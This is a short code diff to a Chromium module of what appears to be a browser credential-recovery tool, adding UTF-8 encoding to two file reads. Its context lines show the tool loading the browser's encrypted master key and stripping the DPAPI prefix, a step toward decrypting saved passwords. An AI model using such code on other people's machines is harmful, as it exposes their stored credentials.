@@ -55,7 +55,7 @@ class Chromium(ModuleInfo):
 					if os.path.isdir(dirs_path) and dirs.startswith('Profile'):
 						profiles.add(dirs)
 
-				with open(profiles_path) as f:
+				with open(profiles_path, "r", encoding="utf-8") as f:
 					try:
 						data = json.load(f)
 						# Add profiles from json to Default profile. set removes duplicates
@@ -63,7 +63,7 @@ class Chromium(ModuleInfo):
 					except Exception:
 						pass
 
-				with open(profiles_path) as f:
+				with open(profiles_path, "r", encoding="utf-8") as f:
 					try:
 						master_key = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])
 						master_key = master_key[5:]  # removing DPAPI
